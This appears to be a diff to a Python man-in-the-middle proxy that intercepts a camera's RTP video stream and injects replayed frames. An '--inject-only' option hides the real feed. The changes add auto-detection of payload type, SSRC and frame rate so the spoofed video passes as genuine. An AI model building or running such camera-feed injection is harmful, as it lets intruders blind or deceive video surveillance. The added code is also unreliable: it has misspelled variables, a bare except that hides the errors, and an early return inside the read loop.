@@ -84,6 +84,8 @@ import threading
 import time
 from pathlib import Path
 from typing import List, Optional, Tuple
+from rtp_probe import RTPProbe
+
 
 # ──────────────────────────────────────────────────────────────────────────────
 # Logging
@@ -115,27 +117,83 @@ def write_captured_frame(fh, channel: int, rtp_payload: bytes):
     fh.flush()
 
 
-def read_capture_file(path: Path) -> List[Tuple[int, bytes]]:
+def read_capture_file(path: Path) -> Tuple[List[Tuple[int, bytes]],dict]:
     """
     Load all captured frames.
     Returns list of (channel, rtp_payload).
     """
     frames: List[Tuple[int, bytes]] = []
+    params = {
+        'pt': None,
+        'ssrc': None,
+        'ssrc_hex': None,
+        'codec_name': None,
+        'fps': 25.0,
+    }
+
     data = path.read_bytes()
     offset = 0
+    first_frame = True
+
     while offset + RECORD_HEADER_SIZE <= len(data):
         total_len, channel, _reserved, rtp_len = struct.unpack_from(
             "!IBBHx", data, offset
         )
         offset += RECORD_HEADER_SIZE
         if offset + rtp_len > len(data):
-            log.warning("Capture file truncated at frame %d", len(frames))
+            log.warning("Capture file truncated at fram %d", len(frames))
             break
         payload = data[offset : offset + rtp_len]
         offset += rtp_len
-        frames.append((channel, payload))
-    log.info("Loaded %d frames from %s", len(frames), path)
-    return frames
+        frames.append((channel,payload))
+
+        #Extraer parametros del primer frame
+        if first_frame and len(payload) >= RTP_HDR_SIZE:
+            flags, pt_m, seq, ts, ssrc = struct.unpack_from(RTP_HDR, payload, 0)
+            pt = pt_m & 0x7F
+            params['pt'] = pt
+            params['ssrc'] = ssrc
+            params['ssrc_hex'] = f"0x{ssrc:08X}"
+
+            #Intentar identificar el codec por PT
+            codec_map = {
+                26: "JPEG",
+                34: "H263",
+                96: "H264",
+                97: "H264",
+                98: "H265",
+                99: "H265",
+                100: "MPEG4",
+            }
+            params['codec_name'] = codec_map.get(pt, f"Unknown(pt={pt})")
+            first_frame = False
+
+
+        #Estimar FPS del archivo (si hay suficientes frames)
+        if len(frames) >= 2:
+            #Usar timestamps RTP para estimar FPS
+            try:
+                _, frist_payload = frames[0]
+                _, last_payload = frames[-1]
+                if len(first_payload) >= RTP_HDR_SIZE and len(last_payload) >= RTP_HDR_SIZE:
+                    _, _, _, first_ts, _ = struct.unpack_from(RTP_HDR, first_payload, 0)
+                    _, _, _, last_ts, _ = struct.unpack_from(RTP_HDR, last_payload, 0)
+                    if last_ts > first_ts:
+                        #Asumiendo clock rate de 90000 Hz (comun para video)
+                        duration_sec = (last_ts - first_ts) / 90000.0
+                        if duration_Sec > 0:
+                            params['fps'] = len(frames) / duration_sec
+
+            except:
+                pass
+
+
+        log.info("Loaded %d frames from %s", len(frames), path)
+        log.info("Parametros detectados: PT=%s SSRC=%s FPS=%.1f Codec=%s", params['pt'], params['ssrc_hex'], params['fps'], params['codec_name'])
+
+        return frames, params
+
+    
 
 
 # ──────────────────────────────────────────────────────────────────────────────
@@ -256,10 +314,12 @@ class MITMProxy:
         capture_fh=None,
         inject_frames: Optional[List[Tuple[int, bytes]]] = None,
     ):
+
         self.client_sock = client_sock
         self.camera_host = camera_host
         self.camera_port = camera_port
         self.args = args
+        self.probe = RTPProbe(probe_duration=self.args.inject_delay, min_frames=30)
         self.capture_fh = capture_fh
         self.inject_frames = inject_frames or []
 
@@ -375,7 +435,23 @@ class MITMProxy:
     # ──────────────────────────────────────────────────────────────────────────
 
     def _on_upstream_frame(self, channel: int, rtp_payload: bytes):
-        # Track sequence/timestamp for seamless injection continuity.
+        if hasattr(self, "probe") and not self.probe.ready():
+            self.probe.feed(channel, rtp_payload)
+
+            if self.probe.ready() and not self._inject_started.is_set():
+                params = self.probe.params()
+
+                log.info(
+                    "Probe listo → PT=%s SSRC=%s FPS=%s",
+                    params["pt"],
+                    params["ssrc_hex"],
+                    params["fps"],
+                )
+
+                self._inject_started.set()
+
+
+	# Track sequence/timestamp for seamless injection continuity.
         parsed = rtp_parse(rtp_payload)
         if parsed:
             _, _, seq, ts, _ = parsed
@@ -500,10 +576,26 @@ def serve(args: argparse.Namespace):
         if not p.exists():
             log.error("Capture file not found: %s", p)
             sys.exit(1)
-        inject_frames = read_capture_file(p)
+        inject_frames, capture_params = read_capture_file(p)
         if not inject_frames:
             log.error("No frames loaded from capture file.")
             sys.exit(1)
+
+        #Autodeteccion
+        if capture_params and capture_params.get('pt') is not None:
+            if not hasattr(args, 'pt') or args.pt is None:
+                args.pt = capture_params['pt']
+                log.info(f"[OK] PT auto-detected from capture file: {args.pt}")
+
+            if args.inject_ssrc is None and capture_params.get('ssrc') is not None:
+                args.inject_ssrc = capture_params['ssrc']
+                log.info(f"[OK] SSRC auto-detected from capture file: {args.inject_ssrc:08X}")
+
+            if args.inject_fps is None and capture_params.get('fps') is not None:
+                #Solo sobrescribe si es el valor por defectp
+                args.inject_fps = capture_params['fps']
+                log.info(f"[OK] FPS auto-detected from capture file: {args.inject_fps:.1f}")
+
 
     session_n = 0
     try:
@@ -578,6 +670,8 @@ def parse_args():
                     help="Override SSRC in injected frames, e.g. 0xdeadbeef (default: keep original)")
     ap.add_argument("--inject-only",    action="store_true",
                     help="In inject mode, suppress the real camera stream; send only injected frames downstream.")
+    ap.add_argument("--pt", type=int, default=None,
+                    help="RTP Payload Type to use for injection (auto-detect if not specified)")
 
     # Misc
     ap.add_argument("--log-level", default="INFO",
